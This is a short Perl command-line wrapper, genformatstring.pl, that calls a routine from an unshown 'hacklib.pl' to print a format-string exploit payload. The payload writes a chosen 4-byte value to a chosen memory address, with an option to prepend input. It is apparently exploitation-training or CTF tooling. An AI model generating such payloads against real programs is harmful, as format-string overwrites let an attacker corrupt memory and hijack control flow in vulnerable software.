#!/usr/bin/perl -w
#
# Syntax:
#   genformatstring.pl <4byte-overwrite-address> <withaddress>

use strict;
use FindBin qw{$RealBin};
use lib "$RealBin";
do "hacklib.pl";

if ($#ARGV < 1){
 print(STDERR "Syntax:\n 	./genformatstring.pl [--inline] <4byte-overwrite-address> <withaddress>\n");
 print(STDERR " 		--inline allows input from STDIN to preceed the format string\n\n");
 exit(1);
}

print(&genformatstring(@ARGV));